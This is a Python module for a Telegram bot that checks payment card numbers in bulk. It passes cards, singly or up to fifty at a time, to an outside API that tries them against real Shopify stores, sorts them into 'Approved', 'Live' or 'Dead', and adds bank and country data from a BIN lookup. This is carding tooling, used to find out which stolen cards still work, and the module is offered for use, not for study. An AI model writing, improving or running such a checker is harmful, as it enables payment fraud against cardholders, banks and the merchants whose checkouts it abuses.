import html
import requests
import time
import re
import random
import concurrent.futures
from urllib.parse import quote_plus
import threading
import asyncio

SHOPIFY_API_ENDPOINTS = [
    "https://auto-shopify-alpha.vercel.app/api/autosh"
]

# Shopify sites to use with the API
SHOPIFY_SITES = [
    "https://dbs838.myshopify.com",
    "https://vaporesso-store.myshopify.com"
]

BIN_API_ENDPOINT = "https://bin-db.vercel.app/api/bin"
MESSAGE_LIMIT = 4096
CARDS_PER_MESSAGE = 5  # প্রতি মেসেজে ৫টি কার্ডের রেজাল্ট
MAX_CARDS_PER_REQUEST = 50  # সর্বোচ্চ ৫০টি কার্ড একসাথে
MAX_WORKERS = 5  # একসাথে কতগুলো থ্রেড চালানো হবে

async def safe_bot_reply(bot, message, text, parse_mode="HTML", max_retries=3):
    """Safely send message with retry logic to handle Telegram API timeouts"""
    for attempt in range(max_retries):
        try:
            return await bot.reply_to(message, text, parse_mode=parse_mode)
        except requests.exceptions.ReadTimeout:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            try:
                return await bot.reply_to(message, "⚠️ Request completed but couldn't send full results due to timeout.", parse_mode=parse_mode)
            except:
                return None
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return None
    return None

async def safe_send_message(bot, chat_id, text, parse_mode="HTML", max_retries=3):
    """Safely send new message with retry logic"""
    for attempt in range(max_retries):
        try:
            return await bot.send_message(chat_id, text, parse_mode=parse_mode)
        except requests.exceptions.ReadTimeout:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return None
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return None
    return None

async def safe_edit_message(bot, chat_id, message_id, text, parse_mode="HTML", max_retries=2):
    """Safely edit message with retry logic"""
    for attempt in range(max_retries):
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode=parse_mode
            )
            return True
        except requests.exceptions.ReadTimeout:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return False
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return False
    return False

async def get_bin_info(bin_number):
    """Get BIN information from BIN API"""
    try:
        url = f"{BIN_API_ENDPOINT}?bin={bin_number}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json'
        }
        
        response = await asyncio.to_thread(requests.get, url, headers=headers, timeout=10)
        data = response.json()
        
        if data.get("status") == "SUCCESS" and data.get("data"):
            bin_data = data["data"][0]
            return {
                "brand": bin_data.get("brand", "N/A"),
                "type": bin_data.get("Type", bin_data.get("type", "N/A")),
                "bank": bin_data.get("issuer", "N/A"),
                "country": bin_data.get("Country", {}).get("Name", "N/A")
            }
        else:
            return {
                "brand": "N/A",
                "type": "N/A", 
                "bank": "N/A",
                "country": "N/A"
            }
    except Exception as e:
        return {
            "brand": "N/A",
            "type": "N/A",
            "bank": "N/A", 
            "country": "N/A"
        }

async def check_card_shopify(card, site_index):
    """Check card using specific Shopify site"""
    max_retries = 2
    site_url = SHOPIFY_SITES[site_index % len(SHOPIFY_SITES)]
    api_url = SHOPIFY_API_ENDPOINTS[0]

    for attempt in range(max_retries + 1):
        try:
            parts = card.strip().split('|')
            if len(parts) != 4:
                return {"card": card, "status": "❌ Invalid format", "bin_info": None}

            cc, mm, yy, cvv = parts
            
            if len(yy) == 2:
                yy = "20" + yy

            card_encoded = quote_plus(f"{cc}|{mm}|{yy}|{cvv}")
            url = f"{api_url}?site={site_url}&cc={card_encoded}"

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }

            response = await asyncio.to_thread(requests.get, url, headers=headers, timeout=30)
            data = response.json()

            if "status" not in data or "data" not in data:
                if attempt < max_retries:
                    time.sleep(1)
                    continue
                return {"card": card, "status": "❌ Invalid response", "bin_info": None}

            status_code = data.get("status", 500)
            response_data = data.get("data", {})
            
            if not isinstance(response_data, dict):
                if attempt < max_retries:
                    time.sleep(1)
                    continue
                return {"card": card, "status": "❌ Data format error", "bin_info": None}

            status = response_data.get("Status", "false").lower()
            response_msg = response_data.get("Response", "").upper()  # Convert to uppercase for easier comparison
            price = response_data.get("Price", "N/A")
            gateway = response_data.get("Gateway", "N/A")
            card_full = response_data.get("cc", card)

            # Get BIN information
            bin_number = cc[:6]
            bin_info = await get_bin_info(bin_number)

            # FIXED: Update status determination logic
            # Check for invalid card responses
            invalid_responses = [
                "INCORRECT_NUMBER", 
                "INVALID_NUMBER", 
                "INVALID_ACCOUNT",
                "DO_NOT_HONOR",
                "TRANSACTION_NOT_ALLOWED",
                "LOST_CARD",
                "STOLEN_CARD",
                "EXPIRED_CARD",
                "INSUFFICIENT_FUNDS",
                "CARD_DECLINED"
            ]
            
            # Check if response indicates invalid card
            is_invalid = False
            for invalid_resp in invalid_responses:
                if invalid_resp in response_msg:
                    is_invalid = True
                    break
            
            # Determine final status
            if status == "true" and not is_invalid and ("APPROVED" in response_msg or "SUCCESS" in response_msg):
                result_status = "Approved ✅"
                status_emoji = "✅"
            elif status == "true" and not is_invalid:
                result_status = "Live ⚠️"  # Warning for unknown response
                status_emoji = "⚠️"
            elif is_invalid or status == "false":
                result_status = "Dead ❌"
                status_emoji = "❌"
            else:
                result_status = "Unknown ❓"
                status_emoji = "❓"

            return {
                "card": card_full,
                "status_emoji": status_emoji,
                "status_text": result_status,
                "response": response_msg,
                "gateway": gateway,
                "price": price,
                "bin_info": bin_info,
                "site": site_url,
                "success": True
            }

        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            return {
                "card": card,
                "status": f"❌ Error: {str(e)[:30]}",
                "bin_info": None,
                "success": False
            }

def format_card_result(result):
    """Format individual card result for display"""
    if not result.get("success"):
        return f"❌ {result['card']} - {result.get('status', 'Failed')}"
    
    output_parts = [
        f"💳 𝗖𝗮𝗿𝗱: <code>{html.escape(result['card'])}</code>",
        f"<b>𝗦𝘁𝗮𝘁𝘂𝘀:</b> {result['status_emoji']} {html.escape(result['status_text'])}",
        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {html.escape(result['response'])}",
        f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆:</b> {html.escape(result['gateway'])} | <b>𝗖𝗵𝗮𝗿𝗴𝗲:</b> ${result['price']}"
    ]
    
    if result['bin_info']:
        output_parts.extend([
            f"•━━━━━ 𝗕𝗶𝗻 𝗜𝗻𝗳𝗼 ━━━━━•",
            f"<b>𝗕𝗿𝗮𝗻𝗱:</b> {html.escape(result['bin_info']['brand'])}",
            f"<b>𝗧𝘆𝗽𝗲:</b> {html.escape(result['bin_info']['type'])}",
            f"<b>𝗕𝗮𝗻𝗸:</b> {html.escape(result['bin_info']['bank'])}",
            f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {html.escape(result['bin_info']['country'])}",
            f"•━━━━━━━━━━━━━━━━━━•"
        ])
    
    return "\n".join(output_parts)

async def check_card_shopify_single(card):
    """Check single card with multiple sites"""
    for i in range(len(SHOPIFY_SITES)):
        result = await check_card_shopify(card, i)
        if result.get("success") and "✅" in result.get("status_text", ""):
            return result
    
    # If no approved results, return the first successful result
    for i in range(len(SHOPIFY_SITES)):
        result = await check_card_shopify(card, i)
        if result.get("success"):
            return result
    
    # If all failed, return the last attempt
    return await check_card_shopify(card, 0)

async def mass_check_cards(cards, progress_callback=None):
    """Mass check cards with threading"""
    results = []
    completed = 0
    total = len(cards)
    
    async def worker(card, index):
        nonlocal completed
        site_index = index % len(SHOPIFY_SITES)
        result = await check_card_shopify(card, site_index)
        results.append((index, result))
        completed += 1
        if progress_callback:
            progress_callback(completed, total)
    
    threads = []
    for i, card in enumerate(cards):
        thread = threading.Thread(target=lambda c=card, ii=i: asyncio.run(worker(c, ii)))
        thread.start()
        threads.append(thread)
        
        # Limit concurrent threads
        if len(threads) >= MAX_WORKERS:
            for t in threads:
                t.join()
            threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join()
    
    # Sort results by original order
    results.sort(key=lambda x: x[0])
    return [result for _, result in results]

def create_progress_bar(percentage):
    """Create a visual progress bar"""
    filled = int(percentage / 10)
    empty = 10 - filled
    return "█" * filled + "░" * empty

def register(bot, custom_command_handler, command_prefixes_list, check_usage_limit=None):
    @custom_command_handler("shopify", "sh")
    async def handle_shopify(message):
        if check_usage_limit and not await check_usage_limit(message, "Shopify"):
            return
        parts_split = message.text.strip().split()
        if len(parts_split) > 1:
             site_url = " ".join(parts_split[1:]).strip()
        else:
             site_url = ""
        if not site_url:
            await safe_bot_reply(bot, message, "❌ Provide a card to check. Format: `cc|mm|yy|cvv`. Example: `/sh 5210690900018949|09|31|384`", parse_mode="Markdown")
            return

        card = site_url.split()[0]

        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card):
            await safe_bot_reply(bot, message, "❌ Invalid card format. Use: `cc|mm|yy|cvv` where cc=13-19 digits, mm=month, yy=year, cvv=3-4 digits", parse_mode="Markdown")
            return

        user = message.from_user
        username = f"@{user.username}" if user.username else user.first_name if user.first_name else str(user.id)
        footer = f"•──────────────────────•\n𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗯𝘆: {username}"

        sent_msg = await safe_bot_reply(bot, message, f"🔄 Checking card with Shopify APIs...", parse_mode="HTML")
        if not sent_msg:
            return

        result = await check_card_shopify_single(card)
        formatted_result = format_card_result(result)
        
        await safe_edit_message(
            bot, 
            sent_msg.chat.id, 
            sent_msg.message_id, 
            f"{formatted_result}\n{footer}",
            parse_mode="HTML"
        )

    @custom_command_handler("mshopify", "msh")
    async def handle_mass_shopify(message):
        if not message.reply_to_message:
            await safe_bot_reply(bot, message, f"❌ Please reply to a message containing cards. Example: `{command_prefixes_list[0]}msh` replied to a message with `cc|mm|yy|cvv` lines.", parse_mode="Markdown")
            return

        lines = message.reply_to_message.text.strip().split('\n')
        cards = []
        for line in lines:
            line = line.strip()
            if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', line):
                cards.append(line)

        if not cards:
            await safe_bot_reply(bot, message, "❌ No valid cards found in the replied message. Format: cc|mm|yy|cvv")
            return

        # Check card limit
        if len(cards) > MAX_CARDS_PER_REQUEST:
            await safe_bot_reply(bot, message, f"⚠️ Limit exceeded! Maximum {MAX_CARDS_PER_REQUEST} cards allowed. You provided {len(cards)} cards.", parse_mode="HTML")
            return

        user = message.from_user
        username = f"@{user.username}" if user.username else user.first_name

        # Start message
        sent_msg = await safe_bot_reply(bot, message, 
            f"🔄 <b>Mass Check Started</b>\n"
            f"📊 Total Cards: {len(cards)}\n"
            f"⏳ Please wait...\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Progress: [░░░░░░░░░░] 0%\n"
            f"Completed: 0/{len(cards)}",
            parse_mode="HTML"
        )
        
        if not sent_msg:
            return

        message_objects = [sent_msg]
        all_results = []
        
        async def update_progress(completed, total):
            """Update progress in Telegram message"""
            try:
                percentage = int((completed / total) * 100)
                progress_bar = create_progress_bar(percentage)
                
                # Determine which message to update
                msg_index = 0
                current_msg = message_objects[msg_index]
                
                progress_text = (
                    f"🔄 <b>Mass Check In Progress</b>\n"
                    f"📊 <b>𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀:</b> {total}\n"
                    f"⏳ Checking...\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀:</b> [{progress_bar}] {percentage}%\n"
                    f"<b>𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱:</b> {completed}/{total}\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
                
                await safe_edit_message(
                    bot,
                    current_msg.chat.id,
                    current_msg.message_id,
                    progress_text,
                    parse_mode="HTML"
                )
            except:
                pass

        # Start mass checking
        all_results = await mass_check_cards(cards, update_progress)

        # Process and display results in batches
        for i in range(0, len(all_results), CARDS_PER_MESSAGE):
            batch_start = i
            batch_end = min(i + CARDS_PER_MESSAGE, len(all_results))
            batch_results = all_results[batch_start:batch_end]
            
            formatted_results = []
            for result in batch_results:
                formatted_results.append(format_card_result(result))
            
            user = message.from_user
            username = f"@{user.username}" if user.username else user.first_name if user.first_name else str(user.id)
            footer = f"•──────────────────────•\n𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗯𝘆: {username}"

            # Create message text for this batch
            if i == 0:
                # First message
                message_text = (
                    f"✅ <b>Mass Check Completed</b>\n"
                    f"📊 <b>𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀:</b> {len(cards)}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"\n\n".join(formatted_results) +
                    f"\n\n━━━━━━━━━━━━━━━━━━\n"
                    f"<b>𝗕𝗮𝘁𝗰𝗵:</b> {batch_start+1}-{batch_end} of {len(cards)}"
                    f"\n{footer}"
                )
            else:
                # Subsequent messages
                message_text = (
                    f"📄 <b>Continuing Results</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"\n\n".join(formatted_results) +
                    f"\n\n━━━━━━━━━━━━━━━━━━\n"
                    f"Batch: {batch_start+1}-{batch_end} of {len(cards)}"
                )
            
            # Send or edit message
            if i == 0:
                await safe_edit_message(
                    bot,
                    sent_msg.chat.id,
                    sent_msg.message_id,
                    message_text,
                    parse_mode="HTML"
                )
            else:
                new_msg = await safe_send_message(
                    bot,
                    message.chat.id,
                    message_text,
                    parse_mode="HTML"
                )
                if new_msg:
                    message_objects.append(new_msg)
            
            # Small delay to avoid rate limiting
            time.sleep(0.3)

        # Send summary
        summary = generate_summary(all_results)
        summary_text = (
            f"📈 <b>Check Summary</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱:</b> {summary['approved']}\n"
            f"⚠️ <b>𝗟𝗶𝘃𝗲:</b> {summary['live']}\n"
            f"❌ <b>𝗗𝗲𝗮𝗱/𝗜𝗻𝘃𝗮𝗹𝗶𝗱:</b> {summary['dead']}\n"
            f"❓ <b>𝗨𝗻𝗸𝗻𝗼𝘄𝗻:</b> {summary['unknown']}\n"
            f"🚫 <b>𝗘𝗿𝗿𝗼𝗿𝘀:</b> {summary['errors']}\n"
            f"📊 <b>𝗧𝗼𝘁𝗮𝗹:</b> {summary['total']}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲:</b> {summary['success_rate']}%\n"
            f"\n{footer}"
        )
        
        await safe_send_message(
            bot,
            message.chat.id,
            summary_text,
            parse_mode="HTML"
        )

def generate_summary(results):
    """Generate summary statistics from results"""
    total = len(results)
    approved = 0
    live = 0
    dead = 0
    unknown = 0
    errors = 0
    
    for result in results:
        if not result.get("success"):
            errors += 1
        else:
            status_text = result.get("status_text", "")
            if "✅ Approved" in status_text:
                approved += 1
            elif "⚠️ Live" in status_text:
                live += 1
            elif "❌" in status_text:
                dead += 1
            else:
                unknown += 1
    
    approved_rate = int((approved / total * 100)) if total > 0 else 0
    
    return {
        "total": total,
        "approved": approved,
        "live": live,
        "dead": dead,
        "unknown": unknown,
        "errors": errors,
        "success_rate": approved_rate
    }
